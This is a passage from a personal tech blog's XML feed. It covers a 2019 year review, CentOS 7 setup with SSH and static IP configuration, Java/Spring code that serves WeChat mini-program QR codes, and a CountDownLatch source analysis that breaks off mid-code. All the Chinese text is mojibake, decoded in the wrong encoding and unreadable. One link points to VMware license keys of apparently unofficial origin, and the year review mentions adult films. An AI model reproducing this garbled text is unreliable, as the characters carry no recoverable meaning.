/p><h4 id="2019-03-2019-06"><a href="#2019-03-2019-06" class="headerlink" title="2019.03-2019.06"></a>2019.03-2019.06</h4><p>ËøôÊÆµÊó∂Èó¥Âú®Â≠¶Ê†°Ëøá‰∫Ü‰∏ÄÊÆµÊúÄÈÄçÈÅ•Ëá™Âú®ÁöÑÊó•Â≠êÔºåÊØèÂ§©Áù°Âà∞Ëá™ÁÑ∂ÈÜíÔºàÂΩìÁÑ∂Áé∞Âú®Â∑•‰Ωú‰πüÊòØÁù°Âà∞Ëá™ÁÑ∂ÈÜíÔºâÔºåËøôÊÆµÊó∂Èó¥Â≠¶‰π†‰∫ÜVue,Âπ∂ÂÆåÊàê‰∫ÜÊØï‰∏öËÆæËÆ°,„ÄäÂü∫‰∫éSpringboot+VueÂÆûÁé∞ÁöÑH5ÁΩë‰∏äÂïÜÂüé„ÄãÔºåÊó∂Èó¥ËøòÊòØËõÆÁ¥ßÂáëÁöÑÔºåÂø´Âà∞Á≠îËæ©ÁöÑÊó∂ÂÄôÊâçÂÆåÊàê„ÄÇÂΩìÁÑ∂ÂÜôÊØï‰∏öËÆæËÆ°‰∏çÊòØÊúÄ‰∏ªË¶ÅÁöÑÔºåËÄåÊòØÂÜôËÆ∫ÊñáÊâçÊòØÊúÄ‰∏ªË¶ÅÔºå‰Ω†ÂæóÂÜôÂà∞ÈáçÂ§çÁéá‰∏çÈ´ò„ÄÇÂêéÈù¢Á≠îËæ©ÊòØ‰∏ÄÊ¨°ÈÄöËøáÁöÑ„ÄÇ</p><h4 id="2019-06-2019-12"><a href="#2019-06-2019-12" class="headerlink" title="2019.06-2019-12"></a>2019.06-2019-12</h4><p>ËøôÊÆµÊó∂Èó¥ÔºåÁ¶ªÂºÄÂ≠¶Ê†°ÂêéÔºåÂ∞±Êù•Âà∞‰∫ÜËãèÂ∑ûÔºåÂè™ËÉΩËØ¥Á©∫Ê∞îÁéØÂ¢ÉÂ•ΩÔºàÊàëÊòØÊåáÂ∑•‰∏öÂõ≠Âå∫ËøôËæπÔºâÔºåËøôËæπËèú‰πüÊå∫Â•ΩÁöÑ„ÄÇÁé∞Âú®Âú®ÂÅö‰∏Ä‰∏™Êó•Êú¨ÊúçË£ÖÂìÅÁâåÁöÑÂ§ñÂåÖÔºåÂ∞èÁ®ãÂ∫èÂíåAPPÈÉΩÂú®ÂÅö„ÄÇÂú®ËøôËæπ‰∏ªË¶Å‰ΩøÁî®Java,ÂÅ∂Â∞î‰πüÈúÄË¶Å‰ΩøÁî®PhpÊù•ÂÜô‰∏úË•ø„ÄÇÂèÇ‰∏é‰∫ÜÂæàÂ§öÂ∞èÈ°πÁõÆÔºå‰πüÁªèÂéÜ‰∏çÂ∞ë‰∫ã„ÄÇÂè™ËÉΩËØ¥Ôºå‰ª•ÂâçÂ§©ÁúüÁöÑÊàëÔºåÁº∫‰πèÁ§æ‰ºöÊØíÊâì„ÄÇ</p><h3 id="‰ªäÂπ¥gitÊ¥ªË∑ÉÂ∫¶"><a href="#‰ªäÂπ¥gitÊ¥ªË∑ÉÂ∫¶" class="headerlink" title="‰ªäÂπ¥gitÊ¥ªË∑ÉÂ∫¶"></a>‰ªäÂπ¥gitÊ¥ªË∑ÉÂ∫¶</h3><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373849.08442973838.png" alt="Q7zJVP.png"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373849.2796857433.png" alt="Q7z8bt.png"></p><ul><li>Á¨¨‰∏ÄÂº†ÊòØ6Êúà‰πãÂêéÊñ∞ÂÖ¨Âè∏ÁöÑËÆ∞ÂΩïÔºåÁ¨¨‰∫åÂº†ÊòØgithub‰∏äÁöÑ‰∏äÈù¢ÁöÑÔºåËøòÊúâ‰πãÂâçÂÖ¨Âè∏ÁöÑËÆ∞ÂΩïÊ≤°Ê≥ïÊâæ‰∫Ü </li></ul><h4 id="‰ªäÂπ¥Â≠¶‰π†ÁöÑÊñ∞ÊäÄËÉΩ"><a href="#‰ªäÂπ¥Â≠¶‰π†ÁöÑÊñ∞ÊäÄËÉΩ" class="headerlink" title="‰ªäÂπ¥Â≠¶‰π†ÁöÑÊñ∞ÊäÄËÉΩ"></a>‰ªäÂπ¥Â≠¶‰π†ÁöÑÊñ∞ÊäÄËÉΩ</h4><ul><li>ÁúãÂÆå‰∫Ü Á∫øÁ®ãÁõ∏ÂÖ≥ÁöÑ‰π¶ÔºàÊ±™ÊñáÂêõ„ÄÅÈÇ£‰∏™ÈòøÈáåÁ≥ªÁöÑ‰∫∫ÂÜôÂà∞ÔºâÔºåÁúãÂÆåÂ∞±Âøò‰∫Ü„ÄÇ </li><li>Áúã‰∫Ü‰∏ÄÁÇπNettyÁöÑ‰π¶ÂíåËÆ∞ÂΩïÔºåÂ§ßËá¥‰∫ÜËß£Netty,‰πüÂ≠¶‰π†‰∫ÜÁΩëÁªúÈÄö‰ø°Áõ∏ÂÖ≥ </li><li>‰ΩøÁî®redisÂºÄÂèëÔºå‰πüÂè™ÊòØÂÜ∞Â±±‰∏ÄËßí </li><li>ÂÖ≥‰∫élinuxÁõ∏ÂÖ≥ÔºåÈòÖËØª‰∫ÜÁõ∏ÂÖ≥Êï∞ÊçÆÔºå‰∏çÁÆóÁÜüÁªÉ </li></ul><h4 id="‰ªäÂπ¥Ê∏∏ÊàèËÆ∞ÂΩï"><a href="#‰ªäÂπ¥Ê∏∏ÊàèËÆ∞ÂΩï" class="headerlink" title="‰ªäÂπ¥Ê∏∏ÊàèËÆ∞ÂΩï"></a>‰ªäÂπ¥Ê∏∏ÊàèËÆ∞ÂΩï</h4><ul><li>ÁéãËÄÖÂ∑≤ÁªèËÉΩÂ§öÊ¨°ÂçïÊéíÂà∞ÁéãËÄÖÔºåÂ∑ÖÂ≥∞ËµõÊúÄÈ´ò1458„ÄÇÊúÄÂêéÂèëÁé∞Ê∏∏ÊàèÊîπ‰∫ÜÈù¢ÁõÆÂÖ®ÈùûÔºå‰∏çÊÉ≥Áé©‰∫Ü </li><li>Áé©‰∫ÜËã±ÈõÑËÅîÁõüÔºåËøòÊòØ‰∏çÈÄÇÂ∫î </li><li>Áé©‰∫ÜÁúãÈó®ÁãóÔºåÁàΩÔºåÂ∞±ÊòØÂÆπÊòìËø∑Â§±‰ªªÂä° </li><li>Áé©‰∫ÜcsgoÔºåÁàΩÂïäÔºåÁúüÈÄÇÂêàÊàëËøôÊ†∑ÁöÑ‰∫∫Áé©ÔºåÁé©Áé©‰ºëÈó≤Ê®°Âºè </li></ul><h4 id="‰ªäÂπ¥ÁúãÁâáÊåáÂØº"><a href="#‰ªäÂπ¥ÁúãÁâáÊåáÂØº" class="headerlink" title="‰ªäÂπ¥ÁúãÁâáÊåáÂØº"></a>‰ªäÂπ¥ÁúãÁâáÊåáÂØº</h4><p>ÂçïË∫´ÁãóÂè™ËÉΩÈù†ÁúãÁâáÊù•Áª¥ÊåÅÁîüÊ¥ª‰∫ÜÔºå‰ªäÂπ¥Êó•Êú¨Êé®Âá∫‰∫Ü‰∏çÂ∞ëÂ•ΩÁúãÁöÑÁâá</p><ul><li>ipxÁ≥ªÂàóÔºåÊàëÂè™ËÉΩËØ¥ÔºåÊãçÊëÑÊâãÊ≥ïÂæàÂ•ΩÁúãÔºåipx177Áõ∏ÂÖ≥ÁöÑÔºåÂæàÂ•ΩÁúã </li><li>ÊúâÂæàÂ§öÔºå‰πü‰∏çÂ•Ω‰∏Ä‰∏ÄÁÇπËØÑÔºå‰ΩÜÊòØÁ°ÆÂÆûÂ•ΩÁúãÁöÑÂæàÂ§ö‰ªäÂπ¥„ÄÇ </li></ul><h4 id="‰ªäÂπ¥ÁöÑÊÑüÊÉÖÁîüÊ¥ª"><a href="#‰ªäÂπ¥ÁöÑÊÑüÊÉÖÁîüÊ¥ª" class="headerlink" title="‰ªäÂπ¥ÁöÑÊÑüÊÉÖÁîüÊ¥ª"></a>‰ªäÂπ¥ÁöÑÊÑüÊÉÖÁîüÊ¥ª</h4><p>ËøòÊòØÁ©∫Á©∫Â¶Ç‰πüÔºå0ÂàÜ„ÄÇÂè™ÊúâÁîüÁóÖÁöÑÊó∂ÂÄôÔºåÂíå‰∏Ä‰∏™‰∫∫Êó†ËÅäÁöÑÊó∂ÂÄôÊâç‰ºöÊÉ≥Êâæ‰∏™Â•≥ÊúãÂèã„ÄÇÊúüÂæÖÊòéÂπ¥ËÉΩÈÅáËßÅ‰∏™Â¶πÂ≠ê„ÄÇ</p><p>Ê¢ØÈòü 1.‰∏âËßÇ2.ÈïøÁõ∏3.Á≠âÁ≠â</p><h4 id="Âπ¥Â∫¶ÊÑüÊÉ≥"><a href="#Âπ¥Â∫¶ÊÑüÊÉ≥" class="headerlink" title="Âπ¥Â∫¶ÊÑüÊÉ≥"></a>Âπ¥Â∫¶ÊÑüÊÉ≥</h4><ul><li>‰∫∫ÁöÑÁîüÂëΩÂæàÁü≠ÔºåÊ¥ªÂú®ÂΩì‰∏ã„ÄÇÊØè‰∏™ÊúàÁöÑÂ∑•ËµÑÂèë‰∏ãÊù•ÔºåËØ•Áî®Â∞±Áî®ÔºåÁªôÁà∂ÊØç‰π∞ÁÇπ‰∏úË•øÔºåÂØÑÁÇπÈí±„ÄÇ </li><li>‰ªäÂπ¥ÁöÑÂ§ßÁéØÂ¢ÉÊÑüËßâÂ∞±ÊòØ‰∏≠ÁæéÂØπÊäóÔºåÁÑ∂ÂêéITË°å‰∏öÂ•ΩÂ§öÂÖ¨Âè∏Ë£ÅÂëò„ÄÇÁúüÁöÑÊòØÂáõÂÜ¨Â∞ÜËá≥ </li></ul><h4 id="ÊòéÂπ¥Â±ïÊúõ"><a href="#ÊòéÂπ¥Â±ïÊúõ" class="headerlink" title="ÊòéÂπ¥Â±ïÊúõ"></a>ÊòéÂπ¥Â±ïÊúõ</h4><ul><li>‰∫§‰∏™Â•≥ÊúãÂèã </li><li>Â§öÂ§öÈîªÁÇº </li><li>ÂéªÂè¶‰∏Ä‰∏™ÂüéÂ∏ÇÔºåËØ¥‰∏çÂÆöÊàë‰ºöÂõû‰∏äÊµ∑ÔºåÊàñËÄÖÂéªÊù≠Â∑û </li><li>Êå£Èí±ËÆ©Áà∂ÊØç‰ªñ‰ª¨ÂéªÊóÖÊ∏∏ </li><li>Âä™ÂäõÂ≠¶‰π† </li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ÁîüÊ¥ª </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmwareÂÆâË£Öcentos7Âπ∂ÂºÄÂêØssh</title>
      <link href="/2019/12/09/vmware%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E5%BC%80%E5%90%AFssh/"/>
      <url>/2019/12/09/vmware%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E5%BC%80%E5%90%AFssh/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂéüÁî±"><a href="#ÂéüÁî±" class="headerlink" title="ÂéüÁî±"></a>ÂéüÁî±</h3><p>ËÆ∞ÂΩïÂÆâË£Öcentos7ÔºåÁî±‰∫éË¶ÅÁî®Âà∞dockerÂíåelasticsearch</p><h3 id="‰∏ãËΩΩË∑ØÂæÑ"><a href="#‰∏ãËΩΩË∑ØÂæÑ" class="headerlink" title="‰∏ãËΩΩË∑ØÂæÑ"></a>‰∏ãËΩΩË∑ØÂæÑ</h3><pre><code>vmware : https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.htmlcentos7ÈïúÂÉè: https://www.jianshu.com/p/a63f47e096e8centos7ÂÆâË£ÖÊïôÁ®ã: https://blog.csdn.net/vevenlcf/article/details/78297008</code></pre><h3 id="vmvare-ÂØÜÈí•"><a href="#vmvare-ÂØÜÈí•" class="headerlink" title="vmvare ÂØÜÈí•"></a>vmvare ÂØÜÈí•</h3><p><a href="https://www.nocmd.com/740.html" target="_blank" rel="noopener"> ÂØÜÈí• </a></p><h3 id="centosÂÆâË£Ö"><a href="#centosÂÆâË£Ö" class="headerlink" title="centosÂÆâË£Ö"></a>centosÂÆâË£Ö</h3><p>centos7Êé®Ëçê‰ΩøÁî®englishÔºåÁÑ∂Âêé‰ΩøÁî®ÂëΩ‰ª§Ë°åÂΩ¢ÂºèÂÆâË£Ö</p><h3 id="centos-ÁΩëÁªú"><a href="#centos-ÁΩëÁªú" class="headerlink" title="centos ÁΩëÁªú"></a>centos ÁΩëÁªú</h3><p>Áî±‰∫éÂàöË£ÖÂ•ΩÁöÑcentosÊó†Ê≥ïËÅîÁΩëÔºåÊâÄ‰ª•ÈúÄË¶ÅÈÖçÁΩÆÁΩëÁªú</p><p><a href="https://www.jianshu.com/p/a6c1b98120a7" target="_blank" rel="noopener"> Êé®ËçêÂçöÊñá </a> ÔºåÈÄöËøáÈòÖËØªÊñáÊ°£ÔºåÊâæÂà∞ <code>gateway</code><br>,ÁÑ∂ÂêéÊìç‰ΩúÊñá‰ª∂</p><pre><code>vi  /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p><code>i</code></p><pre><code>BOOTPROTO=static#ÂêØÁî®ÈùôÊÄÅIPÂú∞ÂùÄ„ÄÄ„ÄÄONBOOT=yes  #ÂºÄÂêØËá™Âä®ÂêØÁî®ÁΩëÁªúËøûÊé•„ÄÄ„ÄÄIPADDR=192.168.1.73   # ÈúÄË¶ÅÂíågateway‰∏çÂêåÔºå‰Ω†ÂèØ‰ª•Èöè‰æøÂÜôÔºåÊúÄÂêé‰∏Ä‰∏™Êï∞Â≠ó‰∏ç‰∏ÄÊ†∑„ÄÄ„ÄÄGATEWAY=192.168.1.1  # ÁΩëÁÆ°ÈúÄË¶ÅÈÄÇÂ∫îÊú¨Êú∫„ÄÄ„ÄÄNETMASK=255.255.255.0„ÄÄ„ÄÄDNS1=114.114.114.114„ÄÄ„ÄÄDNS2=8.8.8.8</code></pre><p><code>:wq</code></p><p>ÊµãËØï</p><p><code>service network restart</code> ÈáçÂêØÁΩëÁªú</p><p><code>ping www.baidu.com</code> ÊµãËØï</p><h3 id="ÂºÄÂêØssh"><a href="#ÂºÄÂêØssh" class="headerlink" title="ÂºÄÂêØssh"></a>ÂºÄÂêØssh</h3><p><a href="https://blog.csdn.net/trackle400/article/details/52755571" target="_blank" rel="noopener"> ÂÖ∑‰ΩìÊñáÊ°£ </a></p><p>Êú¨‰∫∫ÊØîËæÉÂñúÊ¨¢ÈÄÇÂ∫îxshellÊù•Êé•Ëß¶ÁΩëÁªú</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂæÆ‰ø°Ëé∑ÂèñÂ∞èÁ®ãÂ∫èÁ†Å</title>
      <link href="/2019/11/26/%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%81/"/>
      <url>/2019/11/26/%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="ÂæÆ‰ø°Â∞èÁ®ãÂ∫èËé∑ÂèñÂ∞èÁ®ãÂ∫èÁ†ÅÁöÑÊó†ÈôêÂà∂Êé•Âè£ÊòØËøîÂõû‰∫åËøõÂà∂ÂÜÖÂÆπ"><a href="#ÂæÆ‰ø°Â∞èÁ®ãÂ∫èËé∑ÂèñÂ∞èÁ®ãÂ∫èÁ†ÅÁöÑÊó†ÈôêÂà∂Êé•Âè£ÊòØËøîÂõû‰∫åËøõÂà∂ÂÜÖÂÆπ" class="headerlink" title="ÂæÆ‰ø°Â∞èÁ®ãÂ∫èËé∑ÂèñÂ∞èÁ®ãÂ∫èÁ†ÅÁöÑÊó†ÈôêÂà∂Êé•Âè£ÊòØËøîÂõû‰∫åËøõÂà∂ÂÜÖÂÆπ"></a>ÂæÆ‰ø°Â∞èÁ®ãÂ∫èËé∑ÂèñÂ∞èÁ®ãÂ∫èÁ†ÅÁöÑÊó†ÈôêÂà∂Êé•Âè£ÊòØËøîÂõû‰∫åËøõÂà∂ÂÜÖÂÆπ</h2><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373850.4445167838.png" alt="MxzZ8g.png"><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373850.69352827871.png" alt="MxzVPS.png"></p><h3 id="ËØ∑Ê±ÇÂæÆ‰ø°Êé•Âè£Ëé∑ÂèñÂ≠óËäÇÊï∞ÁªÑbyte"><a href="#ËØ∑Ê±ÇÂæÆ‰ø°Êé•Âè£Ëé∑ÂèñÂ≠óËäÇÊï∞ÁªÑbyte" class="headerlink" title="ËØ∑Ê±ÇÂæÆ‰ø°Êé•Âè£Ëé∑ÂèñÂ≠óËäÇÊï∞ÁªÑbyte[]"></a>ËØ∑Ê±ÇÂæÆ‰ø°Êé•Âè£Ëé∑ÂèñÂ≠óËäÇÊï∞ÁªÑbyte[]</h3><pre><code> public byte[] getQrCodeUnlimited(String scene,String page){        // Ëé∑Âèñaccess_token ËØ∑Ëá™Â∑±Â∞ÅË£Ö        String accessToken = getAccessToken();        Map&lt;String,String&gt; params = new HashMap&lt;&gt;(3);        params.put(&quot;scene&quot;,scene);        params.put(&quot;page&quot;,page);        try {            byte[] buffer = HttpClientUtil.doJsonPostRawResponse(&quot;https://api.weixin.qq.com/wxa/getwxacodeunlimit?access_token=&quot; + accessToken, null, params);            return buffer;        }catch (Exception e){            e.printStackTrace();            return null;        }    }// Ê≠§Â§ÑÁöÑhttpUtilÊòØÊàëËá™Â∑±Â∞ÅË£ÖÁöÑÔºå‰Ω†‰πüÂèØ‰ª•‰ΩøÁî®[wxJava](https://github.com/Wechat-Group/WxJava)ÈáåÈù¢ÁöÑÂ∞èÁ®ãÂ∫èËé∑ÂèñbyteÊï∞ÁªÑÁöÑÊñπÊ≥ïËé∑ÂèñÔºåÁ¨¨‰∫åÁßçÊ≤°ÊúâÂ∞ùËØïËøá</code></pre><h3 id="ÈÄöËøáspringmvcËæìÂá∫Âá∫Âéª"><a href="#ÈÄöËøáspringmvcËæìÂá∫Âá∫Âéª" class="headerlink" title="ÈÄöËøáspringmvcËæìÂá∫Âá∫Âéª"></a>ÈÄöËøáspringmvcËæìÂá∫Âá∫Âéª</h3><pre><code>@RequestMapping(&quot;/qrcode&quot;)@RestControllerpublic class QrCodeController {    @Autowired    private WechatUtil wechatUtil;    // Ëøô‰∏™ÊñπÊ≥ïÂèØ‰ª•ÂÆûÁé∞ÔºåÂçÅÂàÜÁÆÄÂçï    @RequestMapping(&quot;/unlimted&quot;)    public void getQrcodeUnlimted(@RequestParam(value = &quot;page&quot;,required = false)String page,@RequestParam(value = &quot;sid&quot;,required = false)String sid, HttpServletResponse response) throws IOException {        sid = URLDecoder.decode(sid,&quot;UTF-8&quot;);        String scene = sid;        byte[] buffer =  wechatUtil.getQrCodeUnlimited(scene,page);        response.setContentType(&quot;image/jpeg&quot;);        OutputStream outputStream = response.getOutputStream();        outputStream.write(buffer);        outputStream.flush();        outputStream.close();    }    // ‰∏ãÈù¢Ëøô‰∏™ÊñπÊ≥ïÔºå‰πüÂèØ‰ª•ÂÆûÁé∞    @RequestMapping(&quot;/unlimted2&quot;)    public ResponseEntity&lt;byte[]&gt; getQrcodeUnlimted2(@RequestParam(value = &quot;page&quot;,required = false)String page, @RequestParam(value = &quot;sid&quot;,required = false)String sid, HttpServletResponse response) throws IOException {        sid = URLDecoder.decode(sid,&quot;UTF-8&quot;);        String scene = sid;        byte[] buffer =  wechatUtil.getQrCodeUnlimited(scene,page);        HttpHeaders headers = new HttpHeaders();        headers.setCacheControl(CacheControl.noCache().getHeaderValue());        headers.setContentType(MediaType.IMAGE_JPEG);        ResponseEntity&lt;byte[]&gt; responseEntity = new ResponseEntity&lt;byte[]&gt;(buffer,headers,HttpStatus.OK);        return responseEntity;    }}</code></pre><h3 id="ÂâçÁ´ØÂèØ‰ª•ÈÄöËøá‰øÆÊîπsrcÈáåÈù¢ÁöÑÂÄºÊù•‰øÆÊîπ"><a href="#ÂâçÁ´ØÂèØ‰ª•ÈÄöËøá‰øÆÊîπsrcÈáåÈù¢ÁöÑÂÄºÊù•‰øÆÊîπ" class="headerlink" title="ÂâçÁ´ØÂèØ‰ª•ÈÄöËøá‰øÆÊîπsrcÈáåÈù¢ÁöÑÂÄºÊù•‰øÆÊîπ"></a>ÂâçÁ´ØÂèØ‰ª•ÈÄöËøá‰øÆÊîπsrcÈáåÈù¢ÁöÑÂÄºÊù•‰øÆÊîπ</h3><pre><code>&lt;img src=&quot;data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAUA    AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO        9TXL0Y4OHwAAAABJRU5ErkJggg==&quot; alt=&quot;Red dot&quot; /&gt;</code></pre><p>ÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉ <a href="https://segmentfault.com/q/1010000011529278" target="_blank" rel="noopener"> base64ÂõæÁâá </a> ‰∏≠ÁöÑÈ´òÂàÜÁ≠îÊ°à</p><h3 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h3><p>ËøôÁªàÁ©∂ÊòØ‰ª•IOÊìç‰ΩúÔºåËøîÂõûÊµÅÊó∂ÔºåÂä†‰∫ÜÂ§¥ÈÉ®‰ø°ÊÅØimage/jpeg</p><p>‰∏çÂ§öbbÔºåÊàëÂéªÂΩìÁ§æÁïú‰∫ÜÔºåÂ¶ÇÊûúÊúâÈúÄË¶ÅÂ∑•ÂÖ∑ÂåÖÁöÑÂèØ‰ª•ËØÑËÆ∫„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
            <tag> springboot </tag>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> Â∞èÁ®ãÂ∫èÁ†Å </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CountDownLatchÂíåCyclicBarrierÂàÜÊûê</title>
      <link href="/2019/10/16/CountDownLatch%E5%92%8CCyclicBarrier%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/16/CountDownLatch%E5%92%8CCyclicBarrier%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="CountDownLatchÂá†‰∏™ÁªèÂ∏∏Áî®ÁöÑÊñπÊ≥ïÂàÜÊûê"><a href="#CountDownLatchÂá†‰∏™ÁªèÂ∏∏Áî®ÁöÑÊñπÊ≥ïÂàÜÊûê" class="headerlink" title="CountDownLatchÂá†‰∏™ÁªèÂ∏∏Áî®ÁöÑÊñπÊ≥ïÂàÜÊûê"></a>CountDownLatchÂá†‰∏™ÁªèÂ∏∏Áî®ÁöÑÊñπÊ≥ïÂàÜÊûê</h3><h4 id="CountDownLatchÊûÑÈÄ†ÂáΩÊï∞"><a href="#CountDownLatchÊûÑÈÄ†ÂáΩÊï∞" class="headerlink" title="CountDownLatchÊûÑÈÄ†ÂáΩÊï∞"></a>CountDownLatchÊûÑÈÄ†ÂáΩÊï∞</h4><pre><code>public CountDownLatch(int count) {    if (count &lt; 0) throw new     IllegalArgumentException(&quot;count &lt; 0&quot;);    //Ê≠§Â§ÑË∞ÉÁî®CountDownLatchÁöÑÈòüÂàóÂêåÊ≠•Âô®    this.sync = new Sync(count);}//ËÆæÁΩÆstateSync(int count) {    setState(count);}</code></pre><h4 id="CountDownLatchÁöÑawait"><a href="#CountDownLatchÁöÑawait" class="headerlink" title="CountDownLatchÁöÑawait()"></a>CountDownLatchÁöÑawait()</h4><pre><code>/**     * Causes the current thread to wait until the latch has counted down to     * zero, unless the thread is {@linkplain Thread#interrupt interrupted}.     *     * &lt;p&gt;If the current count is zero then this method returns immediately.     *     * &lt;p&gt;If the current count is greater than zero then the current     * thread becomes disabled for thread scheduling purposes and lies     * dormant until one of two things happen:     */     //‰∏äÈù¢ÁøªËØëÂ§ßÊÑèÊòØÔºöÂΩìÂâçÁ∫øÁ®ãÁ≠âÂæÖÁõ¥Âà∞stateÂà∞0Êó∂     //Èô§ÈùûË¢´ÊâìÊñ≠    public void await() throws InterruptedException {        sync.acquireSharedInterruptibly(1);    }    //Ë∞ÉÁî®Ê®°ÊùøÊñπÊ≥ï‰∏≠ÁöÑtryAcquireShared(arg)    public final void acquireSharedInterruptibly(int arg)            throws InterruptedException {        if (Thread.interrupted())            throw new InterruptedException();        if (tryAcquireShared(arg) &lt; 0)            doAcquireSharedInterruptibly(arg);    }    //ÂΩìËé∑ÂèñÂà∞stateÊòØÂê¶Á≠â‰∫é0ÔºåËøîÂõû1ÊàñËÄÖ-1     protected int tryAcquireShared(int acquires) {            return (getState() == 0) ? 1 : -1;        }</code></pre><h4 id="CountDownLatch‰∏≠ÁöÑcountDown"><a href="#CountDownLatch‰∏≠ÁöÑcountDown" class="headerlink" title="CountDownLatch‰∏≠ÁöÑcountDown()"></a>CountDownLatch‰∏≠ÁöÑcountDown()</h4><pre><code>/**    * Decrements the count of the latch, releasing all waiting threads if    * the count reaches zero.    *    * &lt;p&gt;If the current count is greater than zero then it is decremented.    * If the new count is zero then all waiting threads are re-enabled for    * thread scheduling purposes.    *    * &lt;p&gt;If the current count equals zero then nothing happens.    */    //ÂáèÂ∞ëstateÊï∞ÈáèÔºåÂ¶ÇÊûúÂà∞Ëææ0ÔºåÈáäÊîæÊâÄÊúâÊ≠£Âú®Á≠âÂæÖÁöÑÁ∫øÁ®ã   public void countDown() {       sync.releaseShared(1);   }    public final boolean releaseShared(int arg) {       if (tryReleaseShared(arg)) {           doReleaseShared();           return true;       }       return false;   }   //ËøôÊòØCountDownLatchÁ±ªÂûãÈáçÂÜôÁöÑÊ®°ÊùøÊñπÊ≥ï    protected boolean tryReleaseShared(int releases) {           // Decrement count; signal when transition to zero           for (;;) {               int c = getState();               if (c == 0)                   return false;               int nextc = c-1;               if (compareAndSetState(c, nextc))                   //Âè™ÊúâÁ≠â‰∫é0ÁöÑÊó∂ÂÄôÊâç‰ºöËøîÂõûtrue                   return nextc == 0;           }       }</code></pre><h4 id="CountDownLatchÁöÑÂÆòÊñπÁ§∫‰æã"><a href="#CountDownLatchÁöÑÂÆòÊñπÁ§∫‰æã" class="headerlink" title="CountDownLatchÁöÑÂÆòÊñπÁ§∫‰æã"></a>CountDownLatchÁöÑÂÆòÊñπÁ§∫‰æã</h4><pre><code>* class Driver2 { // ... *   void main() throws InterruptedException { *     CountDownLatch doneSignal = new CountDownLatch(N); *     Executor e = ... * *     for (int i = 0; i &lt; N; ++i) // create and start threads *       e.execute(new WorkerRunnable(doneSignal, i)); * *     doneSignal.await();           // wait for all to finish *   } * } * * class WorkerRunnable implements Runnable { *   private final CountDownLatch doneSignal; *   private final int i; *   WorkerRunnable(CountDownLatch doneSignal, int i) { *     this.doneSignal = doneSignal; *     this.i = i; *   } *   public void run() { *     try { *       doWork(i); *       doneSignal.countDown(); *     } catch (InterruptedException ex) {} // return; *   } * *   void doWork() { ... } * }}&lt;/pre&gt; *</code></pre><h4 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>ÊûÑÈÄ†ÂáΩÊï∞N,Ë∞ÉÁî®await()ÂºÄÂßãÔºåÁü•ÈÅìcountDown()NÊ¨°ÔºåÊâç‰ºöÁªßÁª≠ÊâßË°åÂêéÁª≠Êìç‰Ωú<br>ÂÖ∑‰ΩìÂéüÁêÜÔºåÂ∞±ÊòØawait()‰πüÂ∞±ÊòØlock()ÂΩìÂâçÁ∫øÁ®ãÔºåÔºà‰∏äËø∞ÁöÑ‰æãÂ≠ê‰∏≠ÊòØmainÁ∫øÁ®ãÔºâ,ÂêéÈù¢‰ºöË∞ÉÁî®<br>countDown()NÊ¨°ÔºåÊâç‰ºöunlock()ÂΩìÂâçÁ∫øÁ®ã</p><h3 id="CyclicBarrier‰æãÂ≠ê"><a href="#CyclicBarrier‰æãÂ≠ê" class="headerlink" title="CyclicBarrier‰æãÂ≠ê"></a>CyclicBarrier‰æãÂ≠ê</h3><h4 id="ÂêåÊó∂ËÆ°ÁÆóN‰∏™Á§∫‰æãÔºåËÆ°ÁÆóÂÆåN‰∏™Á§∫‰æãÔºåÊâßË°årunnableÈáåÈù¢ÁöÑrun-ÊñπÊ≥ï"><a href="#ÂêåÊó∂ËÆ°ÁÆóN‰∏™Á§∫‰æãÔºåËÆ°ÁÆóÂÆåN‰∏™Á§∫‰æãÔºåÊâßË°årunnableÈáåÈù¢ÁöÑrun-ÊñπÊ≥ï" class="headerlink" title="ÂêåÊó∂ËÆ°ÁÆóN‰∏™Á§∫‰æãÔºåËÆ°ÁÆóÂÆåN‰∏™Á§∫‰æãÔºåÊâßË°årunnableÈáåÈù¢ÁöÑrun()ÊñπÊ≥ï"></a>ÂêåÊó∂ËÆ°ÁÆóN‰∏™Á§∫‰æãÔºåËÆ°ÁÆóÂÆåN‰∏™Á§∫‰æãÔºåÊâßË°årunnableÈáåÈù¢ÁöÑrun()ÊñπÊ≥ï</h4><pre><code>import java.util.Map;import java.util.concurrent.*;public class BankWaterService implements Runnable{    //ÂàõÂª∫4‰∏™Â±èÈöúÔºåÂ§ÑÁêÜÂÆå‰πãÂêéÊâßË°åÂΩìÂâçÁ±ªÁöÑrunÊñπÊ≥ï    private CyclicBarrier cyclicBarrier = new CyclicBarrier(4,this);    //ÂÅáÂ¶ÇÂè™Êúâ4‰∏™sheet,ÊâÄ‰ª•ÂêØÂä®4‰∏™Á∫øÁ®ã    private ExecutorService executor = Executors.newFixedThreadPool(4);    private ConcurrentHashMap&lt;String,Integer&gt; sheetBankWaterCount = 